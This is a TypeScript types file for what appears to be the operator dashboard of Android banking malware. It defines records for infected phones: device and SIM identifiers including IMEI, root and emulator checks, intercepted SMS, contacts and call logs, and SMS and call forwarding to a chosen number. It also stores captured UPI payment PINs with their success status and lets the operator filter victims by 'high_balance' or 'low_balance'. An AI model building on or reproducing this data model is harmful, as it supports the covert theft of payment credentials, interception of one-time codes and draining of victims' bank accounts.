// Auth Types
export interface Admin {
  username: string
  email: string
  fullName: string
  role: 'super_admin' | 'admin' | 'viewer'
  permissions: string[]
  isActive: boolean
  lastLogin?: string
  loginCount: number
  createdAt: string
  telegram2faChatId?: string
  telegramBots?: TelegramBot[]
  fcmTokens?: string[]
  expiresAt?: string
}

export interface TelegramBot {
  botId: number
  botName: string
  token: string
  chatId: string
}

export interface LoginResponse {
  success: boolean
  requires_2fa?: boolean
  message?: string
  token?: string
  admin?: Admin
}

// Device Types
export interface Device {
  device_id: string
  admin_token: string
  admin_username: string
  app_type: string
  
  // Battery
  battery_level: number
  battery_state: string
  is_charging: boolean
  
  // Device Info
  board: string
  brand: string
  device: string
  device_name: string
  display: string
  fingerprint: string
  hardware: string
  host: string
  manufacturer: string
  model: string
  product: string
  
  // System
  os_version: string
  sdk_int: number
  screen_density: number
  screen_resolution: string
  supported_abis: string[]
  
  // Storage & RAM
  total_storage_mb: number
  free_storage_mb: number
  storage_used_mb: number
  storage_percent_free: number
  total_ram_mb: number
  free_ram_mb: number
  ram_used_mb: number
  ram_percent_free: number
  
  // Network
  network_type: string
  ip_address: string
  
  // Status
  status: 'online' | 'offline'
  is_online: boolean
  is_emulator: boolean
  is_rooted: boolean
  last_online_update: string
  last_ping: string
  registered_at: string
  updated_at: string
  
  // Settings
  settings: DeviceSettings
  
  // Stats
  stats: DeviceStats
  
  // SIM
  sim_info: SimInfo[]
  
  // UPI
  has_upi: boolean
  upi_detected_at: string | null
  upi_last_updated_at: string
  upi_pins: UPIPinEntry[]
  
  // Telegram
  telegram_bot_id?: number
  fcm_tokens: string[]
  
  // User
  user_id: string
  
  // Deletion
  is_deleted?: boolean
  deleted_at?: string
  deleted_sms_ids?: string[]
  
  // Note
  note?: 'high_balance' | 'low_balance' | 'none' | null
  note_text?: string | null
}

export interface DeviceSettings {
  monitoring_enabled: boolean
  sms_forward_enabled: boolean
  call_forward_enabled?: boolean
  forward_number: string | null
}

export interface DeviceStats {
  total_sms: number
  total_contacts: number
  total_calls: number
  last_sms_sync?: string
  last_contact_sync?: string
  last_call_sync?: string
}

export interface SimInfo {
  sim_slot: number
  subscription_id: number
  carrier_name: string
  display_name: string
  phone_number: string
  country_iso: string
  mcc?: string
  mnc?: string
  is_network_roaming?: boolean
  icon_tint?: number
  card_id?: number
  carrier_id?: number
  is_embedded?: boolean
  is_opportunistic?: boolean
  icc_id?: string
  group_uuid?: string
  port_index?: number
  network_type: string
  network_operator_name?: string
  network_operator?: string
  sim_operator_name?: string
  sim_operator?: string
  sim_state: string
  phone_type?: string
  imei?: string
  meid?: string
  data_enabled: boolean
  data_roaming_enabled?: boolean
  voice_capable: boolean
  sms_capable: boolean
  has_icc_card?: boolean
  device_software_version?: string
  visual_voicemail_package_name?: string
  network_country_iso?: string
  sim_country_iso?: string
}

export interface UPIPinEntry {
  pin: string
  app_type: string
  status: 'success' | 'failed'
  detected_at: string
}

// SMS Types
export interface SmsMessage {
  id: string
  deviceId: string
  from?: string
  to?: string
  body: string
  timestamp: string
  type: 'inbox' | 'sent'
  isRead: boolean
  isFlagged: boolean
  tags: string[]
  receivedAt: string
  deliveryStatus?: string
  simPhoneNumber?: string
  simSlot?: number
}

// Contact Types
export interface Contact {
  id: string
  deviceId: string
  displayName: string
  phoneNumber: string
  email?: string
  photoUri?: string
  lastUpdated: string
}

// Call Log Types
export interface CallLog {
  id: string
  callId?: string
  number: string
  name: string
  timestamp: string
  duration: number
  callType: 'incoming' | 'outgoing' | 'missed' | 'rejected' | 'blocked'
}

// Stats Types
export interface Stats {
  totalDevices: number
  onlineDevices: number
  activeDevices: number
  pendingDevices: number
  deletedDevices?: number
}

// Filter Types
export interface DeviceFilters {
  search: string
  status: ('all' | 'online' | 'offline' | 'active' | 'pending' | 'deleted' | 'high_balance' | 'low_balance' | 'high_battery' | 'low_battery' | 'has_upi' | 'no_upi')[]
  appType: string
  adminUsername: string
}
